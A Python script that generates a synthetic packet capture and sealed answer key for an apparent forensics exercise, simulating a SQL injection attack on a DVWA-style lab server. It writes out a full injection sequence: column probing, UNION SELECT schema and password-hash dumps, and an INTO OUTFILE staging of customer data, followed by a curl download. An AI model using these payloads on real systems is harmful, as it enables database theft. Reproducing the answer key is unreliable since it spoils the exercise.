#!/usr/bin/env python3
"""Case 02: DVWA-style login -> SQL injection (sqlmap-like UA) -> dump staged on server -> CSV downloaded over HTTP."""
import hashlib
import sys
from datetime import datetime, timezone
from email.utils import formatdate
from pathlib import Path
from urllib.parse import quote, unquote

sys.path.insert(0, str(Path(__file__).resolve().parent))
from pcaplib import Capture, TCP4

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "cases/case02_web_sqli/raw/case02.pcap"
GT = ROOT / "ground_truth/case02_ground_truth.md"

ATT, WEB = "192.168.56.10", "192.168.56.30"
T0 = datetime(2026, 11, 3, 13, 20, 0, tzinfo=timezone.utc).timestamp()
cap = Capture(seed=202)
rng = cap.rng
iso = lambda t: datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3] + "Z"

UA_FF = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
UA_SQLMAP = "sqlmap/1.7.11#stable (https://sqlmap.org)"
UA_CURL = "curl/8.5.0"
SESSID = "7f3a9c1e5b2d4a6f8e0c1b3d5a7f9e21"
COOKIE = f"PHPSESSID={SESSID}; security=low"
REASON = {200: "OK", 302: "Found"}


def req(method, path, ua, cookie=None, body=b"", ctype=None):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {WEB}", f"User-Agent: {ua}", "Accept: */*", "Connection: keep-alive"]
    if cookie:
        lines.append(f"Cookie: {cookie}")
    if body:
        lines += [f"Content-Type: {ctype}", f"Content-Length: {len(body)}"]
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def resp(t, status, body, ctype="text/html;charset=utf-8", extra=()):
    lines = [f"HTTP/1.1 {status} {REASON[status]}", f"Date: {formatdate(t, usegmt=True)}",
             "Server: Apache/2.4.58 (Debian)", *extra, f"Content-Length: {len(body)}",
             "Keep-Alive: timeout=5, max=100", "Connection: Keep-Alive", f"Content-Type: {ctype}"]
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def exchange(s, think, request, status, body, ctype="text/html;charset=utf-8", extra=()):
    s.data(True, request, think=think)
    t_req = s.t
    s.data(False, resp(s.t, status, body, ctype, extra), think=0.004 + len(body) / 4e7)
    return t_req, len(body)


FILL = "<div class='lab-ui'>DVWA-like synthetic lab page</div>\n" * 70
page = lambda title, inner: f"<html><head><title>{title}</title></head><body>{FILL}{inner}</body></html>".encode()
rows_html = lambda rows: "".join(f"<pre>First name: {a}<br>Surname: {b}</pre>" for a, b in rows)
USERS = [("admin", "admin"), ("Gordon", "Brown"), ("Hack", "Me"), ("Pablo", "Picasso"), ("Bob", "Smith")]
inj = lambda payload: "/vulnerabilities/sqli/?id=%s&Submit=Submit" % quote(payload, safe="")

# ---- synthetic customers.csv (500 rows of fake data) ----
FIRST = ["Amira", "Omar", "Laila", "Youssef", "Nour", "Karim", "Salma", "Hany", "Dina", "Tarek", "Mona", "Adel"]
LAST = ["Hassan", "Fouad", "Saad", "Mansour", "Nabil", "Zaki", "Farid", "Said", "Gamal", "Ibrahim"]
rows = ["id,first_name,last_name,email,phone,card_last4"]
for i in range(1, 501):
    rows.append(f"{i},{rng.choice(FIRST)},{rng.choice(LAST)},user{i:04d}@example.test,"
                f"+20100{rng.randint(1000000, 9999999)},{rng.randint(0, 9999):04d}")
CSV = ("\n".join(rows) + "\n").encode()

ERR1 = ("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version "
        "for the right syntax to use near ''1''' at line 1")
STEPS = [
    ("1'", f"<pre>{ERR1}</pre>"),
    ("1' OR '1'='1", rows_html(USERS)),
    ("1' ORDER BY 1-- -", rows_html(USERS[:1])),
    ("1' ORDER BY 2-- -", rows_html(USERS[:1])),
    ("1' ORDER BY 3-- -", "<pre>Unknown column '3' in 'order clause'</pre>"),
    ("1' UNION SELECT 1,2-- -", rows_html(USERS[:1] + [("1", "2")])),
    ("1' UNION SELECT user(),database()-- -", rows_html(USERS[:1] + [("app@localhost", "dvwa")])),
    ("1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='dvwa'-- -",
     rows_html(USERS[:1] + [("guestbook", "dvwa"), ("users", "dvwa"), ("customers", "dvwa")])),
    ("1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='customers'-- -",
     rows_html(USERS[:1] + [(c, "2") for c in ["id", "first_name", "last_name", "email", "phone", "card_last4"]])),
    ("1' UNION SELECT user,password FROM users-- -",
     rows_html(USERS[:1] + [("admin", "5f4dcc3b5aa765d61d8327deb882cf99"), ("gordonb", "e99a18c428cb38d5f260853678922e03"),
                            ("1337", "8d3533d75ae2c3966d7e0d4fcc69216b"), ("pablo", "0d107d09f5bbe40cade3de5c71e9e9b7"),
                            ("smithy", "5f4dcc3b5aa765d61d8327deb882cf99")])),
    ("1' UNION SELECT id,CONCAT_WS(',',first_name,last_name,email,phone,card_last4) FROM customers "
     "INTO OUTFILE '/var/www/html/dump/customers.csv'-- -", rows_html(USERS[:1])),
]
log = []

# ---- Session A: operator logs in with a normal browser ----
sA = TCP4(cap, T0, ATT, 52110, WEB, 80, rtt=0.0004)
sA.handshake()
exchange(sA, 1.0, req("GET", "/login.php", UA_FF), 200, page("Login", "<form>login</form>"))
log.append((sA.t, "GET /login.php", 200))
exchange(sA, 3.2, req("POST", "/login.php", UA_FF, body=b"username=admin&password=password&Login=Login",
                      ctype="application/x-www-form-urlencoded"), 302, b"",
         extra=["Location: index.php", f"Set-Cookie: PHPSESSID={SESSID}; path=/", "Set-Cookie: security=low"])
log.append((sA.t, "POST /login.php (admin/password)", 302))
exchange(sA, 0.4, req("GET", "/index.php", UA_FF, COOKIE), 200, page("Welcome", "<h1>Welcome</h1>"))
exchange(sA, 2.5, req("GET", "/vulnerabilities/sqli/", UA_FF, COOKIE), 200, page("SQLi", "<form>id</form>"))
exchange(sA, 3.0, req("GET", inj("1"), UA_FF, COOKIE), 200, page("SQLi", rows_html(USERS[:1])))
sA.close()

# ---- Session B: automated injection (sqlmap-like UA), one keep-alive connection ----
sB = TCP4(cap, T0 + 95, ATT, 52112, WEB, 80, rtt=0.0004)
sB.handshake()
for payload, body in STEPS:
    t_req, blen = exchange(sB, rng.uniform(0.4, 0.9), req("GET", inj(payload), UA_SQLMAP, COOKIE), 200,
                           page("Vulnerability: SQL Injection", body))
    log.append((t_req, unquote(inj(payload)), blen))
sB.close()

# ---- Session C: download of the staged file ----
sC = TCP4(cap, sB.t + 30, ATT, 52140, WEB, 80, rtt=0.0004)
sC.handshake()
t_dl, blen = exchange(sC, 0.8, req("GET", "/dump/customers.csv", UA_CURL, COOKIE), 200, CSV, ctype="text/csv",
                      extra=['Last-Modified: ' + formatdate(sB.t - 5, usegmt=True)])
sC.close()

n = cap.write(OUT)
sha, md5 = hashlib.sha256(CSV).hexdigest(), hashlib.md5(CSV).hexdigest()
GT.write_text(f"""# SEALED GROUND TRUTH - Case 02
- Generated packets: {n}
- Attacker {ATT} -> web server {WEB}:80 (Apache/2.4.58 Debian per Server header)
- Session A (Firefox UA) {iso(T0)}: login with admin/password (302 + Set-Cookie), 5 requests
- Session B (sqlmap-like UA `{UA_SQLMAP}`) from {iso(T0 + 95)}: {len(STEPS)} injection requests on parameter `id`
- Column count of the query = 2 (ORDER BY 2 ok, ORDER BY 3 error)
- Staging: INTO OUTFILE to /var/www/html/dump/customers.csv (visible only as a URI; success is implied by the later download)
- Session C (curl UA) {iso(t_dl)}: GET /dump/customers.csv -> 200, text/csv, {len(CSV)} bytes
- customers.csv sha256 = {sha}
- customers.csv md5    = {md5}
- Total HTTP requests = 17 (5 + 11 + 1); TCP connections = 3 (client ports 52110, 52112, 52140)
- Request log:
""" + "\n".join(f"  - {iso(t)}  {u}  (body {b} B)" for t, u, b in log) + "\n")
print(f"[case02] wrote {OUT} ({n} packets); customers.csv {len(CSV)} B sha256 {sha}")
